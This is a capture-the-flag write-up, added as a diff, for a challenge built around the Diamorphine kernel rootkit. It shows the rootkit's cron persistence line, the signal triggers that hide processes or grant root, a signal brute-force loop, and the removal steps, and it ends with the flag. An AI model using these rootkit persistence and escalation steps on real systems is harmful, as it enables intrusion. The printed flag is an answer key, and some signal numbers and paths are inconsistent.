@@ -1,0 +1,160 @@
+<h1 id="-root-canal">📦 Root Canal</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Category</th>
+      <th>Author</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>📦 Miscellaneous</td>
+      <td>Matt Kiely (HuskyHacks)</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="challenge-prompt">Challenge Prompt</h2>
+
+<p>But what is the real root of the issue?</p>
+
+<h2 id="problem-type">Problem Type</h2>
+<ul>
+  <li>“Diamorphine” Rootkit</li>
+  <li><a href="https://github.com/m0nad/Diamorphine">Diamorphine Rootkit GitHub</a></li>
+</ul>
+
+<h2 id="solve">Solve</h2>
+
+<p>SSH to challenge, found README.txt</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>README.txt
+once you fix your root your root canal, you’ll see a new directory here!
+Do some reconnaissance and you’ll find the real root of the issue.
+</code></pre></div></div>
+
+<p>Checked cron:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.<span class="k">*</span>
+/etc/cron.d: total 20
+drwxr-xr-x 2 root root 4096 Sep 26 14:12 <span class="nb">.</span>
+drwxr-xr-x 88 root root 4096 Oct 31 15:05 ..
+<span class="nt">-rw-r--r--</span> 1 root root 177 Sep 26 14:17 diamorphine
+<span class="nt">-rw-r--r--</span> 1 root root 589 Jan 14 2020 mdadm
+<span class="nt">-rw-r--r--</span> 1 root root 102 Nov 16 2017 .placeholder
+</code></pre></div></div>
+
+<p>/etc/cron.d/diamorphine runs a kernel module at reboot:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">cat</span> /etc/cron.d/diamorphine
+<span class="nv">SHELL</span><span class="o">=</span>/bin/bash
+<span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+@reboot root <span class="nb">cp</span> <span class="nt">-a</span> /opt/.diamorphine/. /dev/shm/ <span class="o">&amp;&amp;</span> insmod /dev/shm/diamorphine.ko <span class="o">||</span> <span class="nb">true</span>
+</code></pre></div></div>
+
+<p>Found the kernel module diamorphine.ko in /opt/.diamorphine/</p>
+
+<blockquote>
+  <p>Typical triggers for Diamorphine in CTFs:</p>
+
+  <table>
+    <thead>
+      <tr>
+        <th>Action</th>
+        <th>Effect</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>kill -31 <pid></pid></td>
+        <td>Hide/unhide process</td>
+      </tr>
+      <tr>
+        <td>kill -63 <pid></pid></td>
+        <td>Make the module become (in)visible</td>
+      </tr>
+      <tr>
+        <td>kill -64 <pid></pid></td>
+        <td>Elevate to root when run as non-root</td>
+      </tr>
+      <tr>
+        <td>Setting file UID</td>
+        <td>Make binary auto-privileged</td>
+      </tr>
+    </tbody>
+  </table>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$$</span>
+763
+ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">kill</span> <span class="nt">-64</span> <span class="nv">$$</span>
+Connection to 10.1.113.7 closed
+</code></pre></div></div>
+<p>That didn’t work here, it caused the SSH session to crash.</p>
+
+<p>We need to send signals without killing the session.
+So don’t send the signal to your own session.
+Instead, spawn a dummy process and test signals on it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sleep </span>99999 &amp;
+<span class="nv">TESTPID</span><span class="o">=</span><span class="nv">$!</span>
+<span class="nb">echo</span> <span class="nv">$TESTPID</span>
+</code></pre></div></div>
+
+<p>Then brute signal numbers to that PID:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>s <span class="k">in</span> <span class="o">{</span>1..200<span class="o">}</span><span class="p">;</span> <span class="k">do
+    </span><span class="nb">kill</span> -<span class="nv">$s</span> <span class="nv">$TESTPID</span> 2&gt;/dev/null
+<span class="k">done</span>
+</code></pre></div></div>
+
+<p>Could have determined it was 11 &amp; 12 by looking at compare “<code class="language-plaintext highlighter-rouge">cmp</code>” functions:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>objdump <span class="nt">-D</span> /opt/.diamorphone/diamorphine.ko | <span class="nb">grep</span> <span class="s2">"cmp"</span>
+cmp <span class="nv">$0xc</span>,%eax <span class="o">(</span>line 4bd<span class="o">)</span> - checks <span class="k">if </span>signal is 12 <span class="o">(</span>0xc <span class="k">in </span>hex<span class="o">)</span>
+cmp <span class="nv">$0xd</span>,%eax <span class="o">(</span>line 4c6<span class="o">)</span> - checks <span class="k">if </span>signal is 13 <span class="o">(</span>0xd <span class="k">in </span>hex<span class="o">)</span>
+cmp <span class="nv">$0xb</span>,%eax <span class="o">(</span>line 4cb<span class="o">)</span> - checks <span class="k">if </span>signal is 11 <span class="o">(</span>0xb <span class="k">in </span>hex<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Then check if you got root:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">whoami
+</span>root
+ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,1001<span class="o">(</span>ctf<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Checked the kernel module</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:/root/snap<span class="nv">$ </span>lsmod | <span class="nb">grep</span> <span class="nt">-i</span> dia
+diamorphine 16384 0
+</code></pre></div></div>
+<p>Module was still loaded
+Removed it to disable the rootkit:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:/root/snap<span class="nv">$ </span>rmmod diamorphine 
+</code></pre></div></div>
+
+<p>Also commented out the commands in the cron job with “#” (this wasn’t needed):</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:/root/snap<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/cron.d/diamorphine 
+</code></pre></div></div>
+
+<p>After removal, hidden directories and files became visible to root.
+Saw a directory squiblydoo with no permissions (d———).</p>
+
+<p>Normally, even root couldn’t cd into it.</p>
+
+<p>Used sudo chmod 777 squiblydoo to give full access.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">sudo chmod </span>777 squiblydoo/
+ctf@ip-10-1-113-7:~<span class="nv">$ </span><span class="nb">cd </span>squiblydoo/
+ctf@ip-10-1-113-7:~/squiblydoo<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 12
+drwxrwxrwx 2 root root 4096 Sep 26 14:12 <span class="nb">.</span>
+drwxr-xr-x 6 ctf ctf 4096 Sep 26 14:19 ..
+<span class="nt">----------</span> 1 root root 39 Sep 26 14:12
+flag.txt
+</code></pre></div></div>
+<p>Then cd squiblydoo worked, revealing flag.txt.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctf@ip-10-1-113-7:~/squiblydoo<span class="nv">$ </span><span class="nb">cat </span>flag.txt
+</code></pre></div></div>
+
+<h2 id="flag">Flag</h2>
+
+<p><code class="language-plaintext highlighter-rouge">flag{ce56efc41f0c7b45a7e32ec7117cf8b9}</code></p>
+
+<p align="right">(<a href="#top">back to top</a>)</p>
